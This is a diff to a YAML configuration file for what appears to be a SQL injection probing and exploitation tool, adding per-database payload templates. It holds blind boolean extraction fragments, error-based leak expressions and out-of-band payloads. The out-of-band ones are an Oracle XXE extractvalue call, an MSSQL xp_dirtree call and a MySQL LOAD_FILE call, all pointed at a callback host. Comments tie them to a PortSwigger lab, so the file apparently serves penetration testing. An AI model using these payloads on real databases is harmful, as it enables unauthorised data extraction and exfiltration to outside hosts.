@@ -126,5 +126,44 @@ duckdb_fact_sql:
   row_count: "SELECT CAST(COUNT(*) AS VARCHAR) FROM {table}"
   scoped_count: "SELECT CAST(COUNT(*) AS VARCHAR) FROM {table} WHERE {where}"
 
+# Blind extraction comparison fragments (used by sqli_probe mode=blind_boolean / blind_time).
+# {expr} = the read-only SELECT to exfiltrate, {pos} = 1-based char index, {n} = comparison
+# operand. The tool substitutes these with str.replace, then drops the result into the caller's
+# injection_template {cond} placeholder. Read-only — these only COMPARE a value, never write.
+blind_extract:
+  postgres:
+    length: "LENGTH(({expr}))>{n}"
+    char_gt: "ASCII(SUBSTRING(({expr}) FROM {pos} FOR 1))>{n}"
+  mysql:
+    length: "LENGTH(({expr}))>{n}"
+    char_gt: "ASCII(SUBSTRING(({expr}),{pos},1))>{n}"
+  mssql:
+    length: "LEN(({expr}))>{n}"
+    char_gt: "ASCII(SUBSTRING(({expr}),{pos},1))>{n}"
+  oracle:
+    length: "LENGTH(({expr}))>{n}"
+    char_gt: "ASCII(SUBSTR(({expr}),{pos},1))>{n}"
+
+# One-shot error-message leak expressions (sqli_probe mode=error_visible). {expr} is forced into
+# a parseable error; the leaked value is pulled back with sqli_exploit's shared error parsers.
+error_leak:
+  postgres: "CAST(({expr}) AS int)"
+  mysql: "extractvalue(1,concat(0x7e,({expr}),0x7e))"
+  mssql: "CONVERT(int,({expr}))"
+  oracle: "(SELECT to_number(({expr})) FROM dual)"
+
+# Out-of-band egress payloads (sqli_probe mode=oast). {url} = full OOB callback URL, {host} = bare
+# host[:port]. Oracle uses EXTRACTVALUE/XMLTYPE external-entity (XXE) DNS resolution — needs only
+# DNS, no network ACL (UTL_HTTP.REQUEST requires a DBMS_NETWORK_ACL_ADMIN grant the DB usually
+# lacks). MySQL LOAD_FILE egress is frequently blocked (secure_file_priv / Linux UNC).
+# Oracle is the BARE extractvalue expression (no `(SELECT ... FROM dual)` wrapper): it slots into a
+# UNION projection template (`' UNION SELECT {cond} FROM dual-- -` → the exact PortSwigger payload)
+# and still works in a concat template. The wrapped scalar subquery executed but never fired the
+# external-entity DNS fetch in the OOB lab; `FROM dual` now comes from the caller's template.
+oast:
+  oracle: "extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://{host}/\"> %remote;]>'),'/l')"
+  mssql: "exec master..xp_dirtree '//{host}/a'"
+  mysql: "(SELECT LOAD_FILE(CONCAT('//', '{host}', '/a')))"
+
 time_threshold_ms: 4500
 max_sleep_seconds: 5
